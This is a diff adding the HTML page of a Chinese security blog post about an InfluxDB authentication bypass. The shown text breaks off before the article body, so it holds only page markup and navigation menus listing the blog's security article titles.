@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+    
+      <link rel="icon" href="/kanxi.jpg">
+    
+
+    <title>
+        
+          浅析Influxdb认证绕过漏洞 - Mi1k7ea
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="/css/spectre.min.css">
+    <link rel="stylesheet" href="/css/spectre-exp.min.css">
+    <link rel="stylesheet" href="/css/spectre-icons.min.css">
+
+    <!-- Noto Sans TC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
+    <!-- Noto Sans SC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
+    <!-- Noto Sans -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">
+
+    <!-- theme css & js -->
+    <link rel="stylesheet" href="/css/book.css">
+    <script src="/js/book.js"></script>
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('img')
+})
+</script>
+
+</head>
+
+<body>
+
+<div class="container">
+  <div class="book-container">
+    <div class="columns">
+      <div class="column col-2 hide-lg">
+        <div class="book-sidebar">
+  <h4 class="site-meta">
+    <a href="/">Mi1k7ea</a>
+  </h4>
+  <div class="sidebar-content">
+    <ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+</ul>
+</li>
+<li>CMS</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+</ul>
+</li>
+<li>爬虫</li>
+<li>Django</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>NodeJS</li>
+<li>AngularJS</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程</li>
+<li>Fuzzing</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks</li>
+<li>Kali</li>
+<li>Metasploit</li>
+<li>内网渗透</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+</ul>
+</li>
+<li>Linux</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+<script src="/js/book-sidebar.js"></script>
+
+<script>
+collapse_sidebar(2)
+highlight_tab()
+show_sidebar()
+</script>
+      </div>
+
+      <div class="column col-8 col-lg-12">
+        <div class="book-content">
+          <div class="book-navbar">
+  <header class="navbar">
+  <section class="navbar-section">
+    <img class="navbar-icon" src="/kanxi.jpg">
+  </section>
+  <section class="navbar-center">
+    Mi1k7ea
+  </section>
+  <section class="navbar-section">
+    <label class="accordion-header c-hand" for="accordion-sidebar">
+      <i class="icon icon-menu"></i>
+    </label>
+  </section>
+</header>
+
+<div class="accordion">
+  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
+  <div class="accordion-body">
+    <ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+</ul>
+</li>
+<li>CMS</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+</ul>
+</li>
+<li>爬虫</li>
+<li>Django</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
